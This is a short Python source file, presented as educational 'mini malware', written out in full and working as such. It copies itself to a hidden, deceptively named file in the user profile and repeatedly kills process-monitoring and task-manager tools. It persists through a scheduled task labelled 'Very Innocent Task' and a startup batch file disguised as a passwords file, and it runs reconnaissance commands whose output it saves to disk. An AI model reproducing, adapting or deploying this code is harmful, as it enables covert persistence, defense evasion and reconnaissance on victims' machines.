# malware.py
#
# Programmer   : Elad L
# Date         : 10/06/2021
#
# This program is a mini malware developed for
# educational purpose
# ---------------------------------------------------


# Imports
import os
import time
import threading

# Constants
FILE_PATH       = fr"{os.environ['USERPROFILE']}\smb_passwords.pyw"
STARTUP_FOLDER  = fr"{os.environ['USERPROFILE']}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
ANALYSIS_TOOLS  = ["procmon.exe", "procmon64.exe", "procexp64.exe", "procexp.exe", "taskmgr.exe"]
RECONNAISSANCE_COMMANDS = ["ipconfig", "whoami /user /groups /priv", "net use"]


def check_file_accessed(start, current_file):
    """
    This function checks if file was accessed, if it has - it's stops the script
    """
    
    while True:
        last_accessed = os.stat(current_file).st_atime

        # Checks whether the file was accessed after the was script started
        if start < last_accessed:
            print(f"Malware stopped running at: {time.ctime(time.time())}")
            os._exit(0)


def msg_user():
    """
    This function sends message to the user's screen every 15 seconds
    """
    
    while True:
        os.system("msg %username% Hello, I'm your malware")
        time.sleep(15)


def anti_analysis():
    """
    This function kills known analysis tools running on the computer
    """
    
    while True:
        [os.system(f"taskkill /f /im {analysis_tool}") for analysis_tool in ANALYSIS_TOOLS]


def main():
    current_file = __file__

    # Checks whether the script is in user's dir
    if current_file != FILE_PATH:

        # This command copies the script to user's dir
        os.system(f"copy {current_file} {FILE_PATH}")

        # This command hide the script using attrib
        os.system(f"attrib +h {FILE_PATH}")

    # Gets unix time stamp
    start = time.time()
    print(f"Malware started running at: {time.ctime(start)}")

    # Runing in parallel to check all the time if file was accessed
    first_thread = threading.Thread(target=check_file_accessed, args=[start, current_file])
    first_thread.start()

    # Runing in parallel to msg the user
    second_thread = threading.Thread(target=msg_user)
    second_thread.start()

    # Runing in parallel to kill analysis tools
    third_thread = threading.Thread(target=anti_analysis)
    third_thread.start()

    # First Persistency: schedueled task (running every three hours)
    sctask_cmd = f'schtasks /create /sc hourly /mo 3 /tn "Very Innocent Task" /tr "python {FILE_PATH}"'
    os.system(sctask_cmd)

    # Second Persistency: user's startup folder
    startup_cmd = fr'echo python {FILE_PATH} > "{STARTUP_FOLDER}\passwords.txt.bat"'
    os.system(startup_cmd)

    # Executing reconnaissance commands
    [os.system(fr"{command} > {os.environ['USERPROFILE']}\findings.txt") for command in RECONNAISSANCE_COMMANDS]


if __name__ == "__main__":
    main()
